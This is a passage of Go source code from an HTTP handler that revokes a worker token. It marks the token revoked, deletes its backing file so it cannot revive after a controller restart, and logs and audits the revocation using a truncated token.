		http.Error(w, `{"error":"token required"}`, 400)
		return
	}

	c.workerTokensMu.Lock()
	c.workerTokens[req.Token] = false
	filePath := c.workerTokenFiles[req.Token]
	delete(c.workerTokenFiles, req.Token)
	c.workerTokensMu.Unlock()

	// 删除 token 文件，防止 controller 重启后该 token 复活
	if filePath != "" {
		if err := os.Remove(filePath); err != nil {
			log.Printf("[auth] failed to delete token file %s: %v", filePath, err)
		}
	}

	log.Printf("[auth] revoked worker token: %s", req.Token[:16]+"...")
	c.auditAction(r, "token_revoke", req.Token[:16]+"...")
	writeJSON(w, map[string]interface{}{"success": true})
}
